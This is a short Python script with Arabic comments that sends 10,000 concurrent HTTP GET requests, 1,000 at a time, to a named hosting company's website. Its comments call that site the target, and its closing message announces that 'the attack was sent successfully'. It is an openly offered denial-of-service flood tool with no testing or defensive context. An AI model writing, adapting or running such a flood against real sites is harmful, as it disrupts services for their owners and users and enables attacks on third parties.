import asyncio
import aiohttp

target_url = "https://mena-hosting.net/"  # قم بتعديلها لتكون عنوان الموقع المستهدف
num_requests = 10000  # عدد الطلبات التي ستتم إرسالها
concurrency = 1000  # عدد الاتصالات المتزامنة

async def send_requests(session):
    tasks = []
    for _ in range(num_requests):
        task = asyncio.ensure_future(session.get(target_url))
        tasks.append(task)
        if len(tasks) >= concurrency:
            await asyncio.gather(*tasks)
            tasks = []
    await asyncio.gather(*tasks)

async def main():
    async with aiohttp.ClientSession() as session:
        await send_requests(session)

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
print("تم إرسال الهجوم بنجاح!")
